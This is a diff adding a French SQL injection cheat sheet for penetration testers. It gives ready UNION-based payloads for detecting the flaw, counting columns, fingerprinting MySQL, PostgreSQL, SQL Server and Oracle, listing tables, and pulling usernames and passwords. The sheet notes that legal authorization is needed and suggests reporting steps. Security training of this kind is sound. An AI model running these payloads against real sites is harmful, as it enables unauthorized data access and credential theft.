@@ -1,0 +1,124 @@
+🎯 SQL Injection – Professional Workflow
+1. Tester la présence d’une injection
+
+👉 Ajoute une apostrophe ' après un paramètre vulnérable dans l’URL ou un formulaire.
+
+Exemple :
+
+http://target.com/page.php?id=1'
+
+Signes positifs
+
+Erreur SQL affichée :
+
+MySQL : You have an error in your SQL syntax
+
+PostgreSQL : syntax error at or near
+
+SQL Server : Unclosed quotation mark
+
+Oracle : ORA-00933: SQL command not properly ended
+
+Changement du contenu de la page (différent d’une valeur “normale”).
+
+2. Déterminer le nombre de colonnes
+
+👉 Nécessaire pour préparer une injection UNION SELECT.
+
+Méthodes :
+
+ORDER BY
+Teste un par un :
+
+?id=1 ORDER BY 1--
+?id=1 ORDER BY 2--
+?id=1 ORDER BY 3--
+...
+
+
+Quand tu reçois une erreur → le nombre de colonnes est juste avant.
+
+UNION NULL
+Exemples :
+
+?id=1 UNION SELECT NULL--
+?id=1 UNION SELECT NULL,NULL--
+?id=1 UNION SELECT NULL,NULL,NULL--
+
+
+Quand la requête passe → tu as trouvé le bon nombre de colonnes.
+
+3. Identifier la base de données (fingerprinting)
+
+👉 Utilise des fonctions spécifiques à chaque SGBD pour deviner lequel est utilisé.
+
+DBMS	Fonction/version test	Exemple d’injection
+MySQL	version()	?id=1 UNION SELECT version(),NULL--
+PostgreSQL	current_database()	?id=1 UNION SELECT current_database(),NULL--
+SQL Server	@@version	?id=1 UNION SELECT @@version,NULL--
+Oracle	banner FROM v$version	?id=1 UNION SELECT banner,NULL FROM v$version--
+4. Extraire des informations utiles
+
+Une fois la version identifiée, tu peux aller plus loin.
+
+Nom de la base courante
+
+MySQL : database()
+
+PostgreSQL : current_database()
+
+SQL Server : db_name()
+
+Oracle : SELECT ora_database_name FROM dual
+
+Lister les tables
+
+MySQL / PostgreSQL : information_schema.tables
+
+SQL Server : information_schema.tables
+
+Oracle : all_tables
+
+Exemple (MySQL) :
+
+?id=1 UNION SELECT table_name,NULL 
+FROM information_schema.tables WHERE table_schema=database()--
+
+
+Lister les colonnes
+
+?id=1 UNION SELECT column_name,NULL 
+FROM information_schema.columns WHERE table_name='users'--
+
+
+Extraire les données
+
+?id=1 UNION SELECT username,password FROM users--
+
+5. Bonnes pratiques pro
+
+⚠️ Toujours avec autorisation légale (pénétration test ou bug bounty).
+
+Documente chaque étape dans un rapport clair :
+
+Payload utilisé
+
+Résultat observé
+
+Preuve (screenshot Burp/Browser)
+
+Impact + recommandations
+
+Utilise Burp Suite pour répéter et affiner les requêtes. (Référence : Burp Suite SQLi Cheat Sheet).
+
+🚀 Workflow résumé (schéma)
+
+Test ' → erreur ? ✅ SQLi possible
+
+Déterminer colonnes (ORDER BY ou UNION NULL)
+
+Identifier DBMS (version()/@@version/etc.)
+
+Enumérer schéma (tables → colonnes → données)
+
+Rapport et mitigation
